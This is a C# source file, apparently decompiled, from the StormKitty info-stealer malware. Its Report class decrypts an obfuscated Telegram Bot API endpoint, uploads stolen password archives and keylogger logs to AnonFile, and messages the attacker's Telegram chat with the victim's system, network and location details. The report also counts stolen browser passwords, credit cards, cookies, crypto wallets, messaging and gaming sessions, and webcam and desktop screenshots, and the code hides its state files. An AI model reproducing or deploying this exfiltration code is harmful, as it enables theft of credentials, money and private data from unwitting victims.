using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using Client.Modules.Implant;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Manager;

internal sealed class Report
{
	private const int MaxKeylogs = 10;

	private static string TelegramBotAPI = StringsCrypt.Decrypt(new byte[32]
	{
		239, 217, 27, 234, 106, 21, 204, 49, 53, 43,
		140, 84, 157, 206, 231, 110, 180, 238, 101, 7,
		217, 169, 12, 49, 56, 145, 75, 213, 195, 135,
		141, 221
	});

	private static string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

	private static string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

	public static void SetLatestMessageId(int id)
	{
		File.WriteAllText(LatestMessageIdLocation, id.ToString());
		Startup.SetFileCreationDate(LatestMessageIdLocation);
		Startup.HideFile(LatestMessageIdLocation);
	}

	public static int GetLatestMessageId()
	{
		if (File.Exists(LatestMessageIdLocation))
		{
			return int.Parse(File.ReadAllText(LatestMessageIdLocation));
		}
		return -1;
	}

	private static int GetMessageId(string response)
	{
		return int.Parse(Regex.Match(response, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));
	}

	public static bool TokenIsValid()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString(TelegramBotAPI + Settings.TelegramToken + "/getMe").StartsWith("{\"ok\":true,");
		}
		catch
		{
		}
		return false;
	}

	public static int SendMessage(string text)
	{
		try
		{
			using WebClient webClient = new WebClient();
			return GetMessageId(webClient.DownloadString(TelegramBotAPI + Settings.TelegramToken + "/sendMessage?chat_id=" + Settings.TelegramChatID + "&text=" + text + "&parse_mode=Markdown&disable_web_page_preview=True"));
		}
		catch
		{
		}
		return 0;
	}

	public static void EditMessage(string text, int id)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString(TelegramBotAPI + Settings.TelegramToken + "/editMessageText?chat_id=" + Settings.TelegramChatID + "&text=" + text + "&message_id=" + id + "&parse_mode=Markdown&disable_web_page_preview=True");
		}
		catch
		{
		}
	}

	private static void UploadKeylogs()
	{
		if (Directory.Exists(Path.Combine(Paths.InitWorkDir(), "logs")))
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
			string text2 = AnonFile.Upload(text + ".zip");
			File.Delete(text + ".zip");
			File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- [" + text.Replace("_", " ").Replace(".", ":") + "](" + text2 + ")\n");
			Startup.HideFile(KeylogsHistory);
		}
	}

	private static string GetKeylogsHistory()
	{
		if (!File.Exists(KeylogsHistory))
		{
			return "";
		}
		List<string> list = File.ReadAllLines(KeylogsHistory).Reverse().Take(10)
			.Reverse()
			.ToList();
		string text = ((list.Count == 10) ? $"({list.Count} - MAX)" : $"({list.Count})");
		string text2 = string.Join("\n", list);
		return "\n\n  ⌨\ufe0f *Keylogger " + text + ":*\n" + text2;
	}

	private static void SendSystemInfo(string url)
	{
		UploadKeylogs();
		string text = "\n  \ud83d\ude39 *StormKitty - Report:*\nDate: " + SystemInfo.datenow + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nUsername: " + SystemInfo.username + "\nCompName: " + SystemInfo.compname + "\nLanguage: " + Flags.GetFlag(SystemInfo.culture.Split(new char[1] { '-' })[1]) + " " + SystemInfo.culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n  \ud83d\udcbb *Hardware:*\nCPU: " + SystemInfo.GetCPUName() + "\nGPU: " + SystemInfo.GetGPUName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nHWID: " + SystemInfo.GetHardwareID() + "\nPower: " + SystemInfo.GetBattery() + "\nScreen: " + SystemInfo.ScreenMetrics() + "\n\n  \ud83d\udce1 *Network:* \nGateway IP: " + SystemInfo.GetDefaultGateway() + "\nInternal IP: " + SystemInfo.GetLocalIP() + "\nExternal IP: " + SystemInfo.GetPublicIP() + "\n" + SystemInfo.GetLocation() + "\n\n  \ud83d\udcb8 *Domains info:*" + Counter.GetLValue("\ud83c\udfe6 *Banking services*", Counter.DetectedBankingServices, '-') + Counter.GetLValue("\ud83d\udcb0 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-') + Counter.GetLValue("\ud83c\udf53 *Porn websites*", Counter.DetectedPornServices, '-') + GetKeylogsHistory() + "\n\n  \ud83c\udf10 *Browsers:*" + Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords) + Counter.GetIValue("\ud83d\udcb3 CreditCards", Counter.CreditCards) + Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies) + Counter.GetIValue("\ud83d\udcc2 AutoFill", Counter.AutoFill) + Counter.GetIValue("⏳ History", Counter.History) + Counter.GetIValue("\ud83d\udd16 Bookmarks", Counter.Bookmarks) + Counter.GetIValue("\ud83d\udce6 Downloads", Counter.Downloads) + "\n\n  \ud83d\uddc3 *Software:*" + Counter.GetIValue("\ud83d\udcb0 Wallets", Counter.Wallets) + Counter.GetIValue("\ud83d\udce1 FTP hosts", Counter.FTPHosts) + Counter.GetIValue("\ud83d\udd0c VPN accounts", Counter.VPN) + Counter.GetIValue("\ud83e\udda2 Pidgin accounts", Counter.Pidgin) + Counter.GetSValue("✈\ufe0f Telegram sessions", Counter.Telegram) + Counter.GetSValue("\ud83d\udcac Discord token", Counter.Discord) + Counter.GetSValue("\ud83c\udfae Steam session", Counter.Steam) + Counter.GetSValue("\ud83c\udfae Uplay session", Counter.Uplay) + "\n\n  \ud83e\udded *Device:*" + Counter.GetSValue("\ud83d\udddd Windows product key", Counter.ProductKey) + Counter.GetIValue("\ud83d\udef0 Wifi networks", Counter.SavedWifiNetworks) + Counter.GetSValue("\ud83d\udcf8 Webcam screenshot", Counter.WebcamScreenshot) + Counter.GetSValue("\ud83c\udf03 Desktop screenshot", Counter.DesktopScreenshot) + "\n\n  \ud83d\udcc4 *File Grabber:*" + Counter.GetIValue("\ud83d\udcc2 Source code files", Counter.GrabberSourceCodes) + Counter.GetIValue("\ud83d\udcc2 Database files", Counter.GrabberDatabases) + Counter.GetIValue("\ud83d\udcc2 Documents", Counter.GrabberDocuments) + Counter.GetIValue("\ud83d\udcc2 Images", Counter.GrabberImages) + "\n\n\ud83d\udd17 [Archive download link](" + url + ")\n\ud83d\udd10 *Archive password is*: \"_" + Client.Modules.Implant.StringsCrypt.ArchivePassword + "\"_";
		int latestMessageId = GetLatestMessageId();
		if (latestMessageId != -1)
		{
			EditMessage(text, latestMessageId);
		}
		else
		{
			SetLatestMessageId(SendMessage(text));
		}
	}

	public static void SendReport(string file)
	{
		Console.WriteLine("Sending passwords archive to anonfile");
		string url = AnonFile.Upload(file, GetLatestMessageId() == -1);
		File.Delete(file);
		Console.WriteLine("Sending report to telegram");
		SendSystemInfo(url);
		Console.WriteLine("Report sent to telegram bot");
	}
}
